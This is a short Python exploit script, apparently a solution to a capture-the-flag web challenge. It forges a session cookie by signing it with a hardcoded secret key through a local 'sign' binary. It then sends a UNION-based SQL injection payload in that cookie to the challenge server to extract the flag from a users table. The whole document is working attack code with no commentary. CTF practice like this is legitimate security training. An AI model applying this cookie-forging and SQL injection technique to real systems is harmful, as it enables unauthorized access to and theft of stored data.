import requests
from subprocess import check_output

secret_key = "d2908c1de1cd896d90f09df7df67e1d4"


def sign(s: str):
    # compile `sign` from `sign.go` with `go build`
    o = check_output(["./sign", secret_key, s])
    return o.strip().decode()


def sqli(s: str):
    sess = sign(s)
    r = requests.post(
        "http://dvd.chal.h4ck3r.quest:10001/",
        cookies={"session": sess},
        allow_redirects=False,
    )
    return r.text.split("<h1>Hi, ")[1].split("</h1>")[0].strip()


print(
    sqli(
        "' union select flag, 'pekomiko' from users where flag like 'FLAG{%' and ''='"
    )
)
